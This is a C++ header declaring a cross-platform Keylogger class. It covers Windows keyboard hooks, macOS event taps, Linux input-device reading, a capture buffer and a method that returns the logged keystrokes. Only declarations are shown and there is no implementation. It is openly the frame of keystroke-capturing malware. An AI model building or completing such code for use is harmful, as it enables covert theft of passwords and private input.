#pragma once
#include "FeatureLibrary.h"

#ifdef __APPLE__
#endif

class Keylogger {
private:         
    static std::vector<std::string> _buffer;     
    static std::mutex _mtx;        
    
    std::thread _workerThread;      
    std::atomic<bool> _isRunning;   

    static void append(const std::string& str);

    #ifdef _WIN32
        static HHOOK _hook;
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
        void WinLoop();
    #endif

    #ifdef __APPLE__
        CFMachPortRef eventTap = nullptr;
        CFRunLoopSourceRef runLoopSource = nullptr;
        
        static CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
        void MacLoop(); 
    #endif

    #ifdef __linux__
        int _fd = -1;
        void LinuxLoop();
    #endif
public:
    Keylogger();
    ~Keylogger();

    void Start();
    void Stop();  

    static std::vector<std::string> getDataAndClear();
};